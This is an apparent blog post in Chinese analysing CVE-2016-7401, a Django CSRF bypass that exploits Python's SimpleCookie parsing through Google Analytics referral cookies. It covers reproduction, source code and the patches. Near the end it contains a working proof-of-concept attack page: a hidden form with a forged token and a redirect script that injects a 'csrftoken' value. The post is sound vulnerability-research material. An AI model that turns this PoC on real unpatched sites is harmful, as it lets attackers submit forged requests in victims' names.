---
layout: post
title: Django CSRF Bypass (CVE-2016-7401) 漏洞分析
---

## 0x00 漏洞概述

### 1.漏洞简介

[Django](https://www.djangoproject.com)是一个由Python写成的开源Web应用框架。在两年前有研究人员在hackerone上提交了一个利用Google Analytics来绕过Django的CSRF防护机制的漏洞([CSRF protection bypass on any Django powered site via Google Analytics](https://hackerone.com/reports/26647))，通过该漏洞，当一个网站使用了Django作为Web框架并且设置了Django的CSRF防护机制，同时又使用了Google Analytics的时候，攻击者可以构造请求来对CSRF防护机制进行绕过。

### 2.漏洞影响

网站满足以下三个条件的情况下攻击者可以绕过Django的CSRF防护机制：

- 使用Google Analytics来做数据统计
- 使用Django作为Web框架
- 使用基于Cookie的CSRF防护机制（Cookie中的某个值和请求中的某个值必须相等）

### 3.影响版本

Django 1.9.x < 1.9.10

Django 1.8.x < 1.8.15

Python2 < 2.7.9

Python3 < 3.2.7

## 0x01 漏洞复现

### 1. 环境搭建

```bash
1. pip install django==1.9.9
2. django-admin startproject project
3. cd project
4. python manage.py startapp app
5. cd app
6. 将 'app' 添加到 project/project/settings.py 中的 INSTALLDE_APPS 列表中
7. 更改或添加下列文件：
```

`project/app/views.py`:

```python
from django.shortcuts import render
from django.http import HttpResponse

# Create your views here.

def check(req):
    if req.method == 'POST':
        return HttpResponse('CSRF check successfully!')
    else:
        return render(req, 'check.html')

def ga(req):
    return render(req, 'ga.html')
```

`project/project/urls.py`:

```python
from django.conf.urls import url
from django.contrib import admin

from app.views import check, ga

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^check/', check, name='check'),
    url(r'^ga/', ga, name='ga'),
]
```

`project/app/templates/check.html`：

```html
<form action="/check/" method="POST">
    {% raw %}
    {% csrf_token %}
    {% endraw %}
    <input type="submit" value="Check"></input>
</form> 
```

`project/app/templates/ga.html`（放置Goolge Analytics脚本的页面）：

```javascript
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-XXXXX-X']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
```

最后运行开启Django内置server：

```bash
# project/
python manage.py runserver
```

### 2.漏洞分析

我们先来看这样一个场景：

![Alt text](/images/2016-09-28-python276-bug.png)

当python内置的`Cookie.SimpleCookie()`解析`a=hello]b=world`这种形式的字符串时会以`]`作为分隔，最后取得`a=hello`和`b=world`这两个cookie，那么为什么会这样呢？

我们看一下源码，Ubuntu下`/usr/lib/python2.7/Cookie.py`第622-663行：

```python
def load(self, rawdata):
    """Load cookies from a string (presumably HTTP_COOKIE) or
    from a dictionary.  Loading cookies from a dictionary 'd'
    is equivalent to calling:
        map(Cookie.__setitem__, d.keys(), d.values())
    """
    if type(rawdata) == type(""):
        self.__ParseString(rawdata)
    else:
        # self.update() wouldn't call our custom __setitem__
        for k, v in rawdata.items():
            self[k] = v
    return
# end load()

def __ParseString(self, str, patt=_CookiePattern):
    i = 0            # Our starting point
    n = len(str)     # Length of string
    M = None         # current morsel

    while 0 <= i < n:
        # Start looking for a cookie
        match = patt.search(str, i)
        if not match: break          # No more cookies

        K,V = match.group("key"), match.group("val")
        i = match.end(0)

        ...
```

当传入`load`一个字符串时，调用`__ParseString`，在`__ParseString`中有这样一句：`match = patt.search(str, i)`，根据之前定义的pattern来查找字符串中符合pattern的cookie，`_CookiePattern`在529-545行：

```python
_LegalCharsPatt  = r"[\w\d!#%&'~_`><@,:/\$\*\+\-\.\^\|\)\(\?\}\{\=]"
_CookiePattern = re.compile(
    r"(?x)"                       # This is a Verbose pattern
    r"(?P<key>"                   # Start of group 'key'
    ""+ _LegalCharsPatt +"+?"     # Any word of at least one letter, nongreedy
    r")"                          # End of group 'key'
    r"\s*=\s*"                    # Equal Sign
    r"(?P<val>"                   # Start of group 'val'
    r'"(?:[^\\"]|\\.)*"'            # Any doublequoted string
    r"|"                            # or
    r"\w{3},\s[\s\w\d-]{9,11}\s[\d:]{8}\sGMT" # Special case for "expires" attr
    r"|"                            # or
    ""+ _LegalCharsPatt +"*"        # Any word or empty string
    r")"                          # End of group 'val'
    r"\s*;?"                      # Probably ending in a semi-colon
    )
```

在这里我们看到`]`并没有在`_LegalCharsPatt`中，由于代码中使用的是`search`函数，所以在匹配`a=hello`后碰到`]`会跳过这个字符然后再匹配`b=world`。因此正是因为使用`search`函数来匹配，所以当`a=hello`后面是任意一个不在`_LegalCharsPatt`中的字符（例如`[`、`\`、`]`、`\x09`、`\x0b`、`\x0c`）都会达到同样的效果：

```python
c.load('a=helloXb=world') # X为上述字符
SetCookie: a='hello' b='world'
```

这个漏洞也正是整个Bypass的核心所在。

我们再来看Django（1.9.9）中对cookie的解析，在`http/cookie.py`中第91-106行：

```python
def parse_cookie(cookie):
    if cookie == '':
        return {}
    if not isinstance(cookie, http_cookies.BaseCookie):
        try:
            c = SimpleCookie()
            c.load(cookie)
        except http_cookies.CookieError:
            # Invalid cookie
            return {}
    else:
        c = cookie
    cookiedict = {}
    for key in c.keys():
        cookiedict[key] = c.get(key).value
    return cookiedict
```

根据动态调试发现这里的`SimpleCookie`也就是我们上面所说的存在漏洞的对象，从而可以确定Django中对cookie的处理也是存在漏洞的。

我们再来看看Django的CSRF防护机制，默认CSRF防护中间件是开启的，我们访问`http://127.0.0.1:8000/check/`，点击Check然后抓包：

![Alt text](/images/2016-09-28-200.png)

可以看到`csrftoken`和`csrfmiddlewaretoken`的值是相同的，其中`csrfmiddlewaretoken`的值如图：

![Alt text](/images/2016-09-28-csrf-form.png)

{% raw %}
也就是Django对`check.html`中的`{% csrf_token %}`所赋的值。
{% endraw %}

我们再改下包，使`csrftoken`和`csrfmiddlewaretoken`不相等，这回服务器就会返回403：

![Alt text](/images/2016-09-28-403.png)

我们再把两个值都改成另外一个值看看：

![Alt text](/images/2016-09-28-200-1.png)

依然成功。

所以Django对于CSRF的防护就是判断cookie中的`csrftoken`和提交的`csrfmiddlewaretoken`的值是否相等。

那么如果想Bypass这个防护机制，就是要想办法设置受害者的cookie中的`csrftoken`值为攻击者构造的`csrdmiddlewaretoken`的值。

如何设置受害者cookie呢？Google Analytics帮了我们这个忙，它为了追踪用户，会在用户浏览时添加如下cookie：

```
__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
```

其中`[HOST]`和`[PATH]`是由Referer确定的，也就是说当`Referer: http://x.com/helloworld`时，cookie如下：

```
__utmz=123456.123456789.11.2.utmcsr=x.com|utmccn=(referral)|utmcmd=referral|utmcct=helloworld
```

由于Referer是我们可以控制的，所以也就有了设置受害者cookie的可能，但是如何设置`csrftoken`的值呢？

这就用到了我们上面说的Django处理cookie的漏洞，当我们设置Referer为`http://x.com/hello]csrftoken=world`，GA设置的cookie如下：

```
__utmz=123456.123456789.11.2.utmcsr=x.com|utmccn=(referral)|utmcmd=referral|utmcct=hello]csrftoken=world
```

当Django解析cookie时就会触发上面说的漏洞，将cookie中`csrftoken`的值赋为`world`。

实际操作一下，为了方便路由我们在另一个IP上再开一个DjangoApp作为中转，其中各文件如下：

`urls.py`:

```python
from django.conf.urls import url
from django.contrib import admin

from app.views import route

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^hello', route)
]
```

`views.py`:

```python
from django.shortcuts import render
from django.http import HttpResponse

# Create your views here.

def route(req):
    return render(req, 'route.html')
```

`route.html`:

```javascript
<script> window.location = 'http://127.0.0.1:8000/ga/'; </script>
```

开启中转App：`python manage.py runserver xxx`

构造一个攻击页面：

```html
<form id="csrf" action="http://127.0.0.1:8000/check/" method="POST">
    <input type="hidden" name="csrfmiddlewaretoken" value="boom">
</form>

<script type="text/javascript" charset="utf-8">
function sleep (time) {
      return new Promise((resolve) => setTimeout(resolve, time));
}

function poc() {
    window.open('http://redirect-server/hello]csrftoken=boom');

    sleep(1000).then(() => {
        document.getElementById('csrf').submit();
    });
}
</script>

<a href='#' onclick=poc()> Click me </a>

```

当我们点击`Click me`，会先打开一个窗口，再回到原窗口，就可以看到保护机制已经绕过：

![Alt text](/images/2016-09-28-success.png)

再访问一下`http://127.0.0.1:8000/check/`，可以看到此时cookie中的`csrftoken`和form中的`csrfmiddlewaretoken`都已被设置成`boom`，证明漏洞成功触发：

![Alt text](/images/2016-09-28-cookie-boom.png)

![Alt text](/images/2016-09-28-form-boom.png)

攻击流程如下：

![Alt text](/images/2016-09-28-bypass-flow.png)


### 3.补丁分析

**Python**

可以看到这个漏洞在根本上是原生Python的漏洞，首先看最早在2.7.9中的patch：

![Alt text](/images/2016-09-28-patch279.png)

将`search`改成了`match`函数，所以再遇到非法符号匹配会停止。

再看该文件在2.7.10中的patch：

![Alt text](/images/2016-09-28-patch2710.png)

这里将`[\]`设置为了合法的value中的字符，也就是

```python
>>> C.load('__utmz=blah]csrftoken=x')
>>> C
<SimpleCookie: __utmz='blah]csrftoken=x'>
```

同样Python3在3.2.7和3.3.6中也做了相应patch：

![Alt text](/images/2016-09-28-patch336.png)

![Alt text](/images/2016-09-28-patch327.png)

不过尽管上面对`[\]`做了限制，但是由于pattern最后`\s*`的存在，所以在以下情况下仍然存在漏洞：

```python
>>> import Cookie
>>> C = Cookie.SimpleCookie()
>>> C.load('__utmz=blah csrftoken=x')
>>> C.load('__utmz=blah\x09csrftoken=x')
>>> C.load('__utmz=blah\x0bcsrftoken=x')
>>> C.load('__utmz=blah\x0ccsrftoken=x')
>>> C
<SimpleCookie: __utmz='blah' csrftoken='x'>
```

这些情况在最新的Python中并没有被修复，不过在实际情况中由于浏览器和脚本的原因，这些字符不一定会保存原样发送给Python处理，所以在利用上还要根据场景来分析。

**Django**

Django在1.9.10和1.8.15中做了相同的patch：

![Alt text](/images/2016-09-28-django1910.png)

它放弃了使用Python内置库来处理cookie，而是自己根据`;`分割再取值，使特殊符号不再起作用。

## 0x02 修复方案

升级Python

升级Django

## 0x03 参考

[https://hackerone.com/reports/26647](https://hackerone.com/reports/26647)

[https://github.com/django/django/commit/d1bc980db1c0fffd6d60677e62f70beadb9fe64a](https://github.com/django/django/commit/d1bc980db1c0fffd6d60677e62f70beadb9fe64a)

[https://developers.google.com/analytics/devguides/collection/analyticsjs/cookie-usage](https://developers.google.com/analytics/devguides/collection/analyticsjs/cookie-usage)
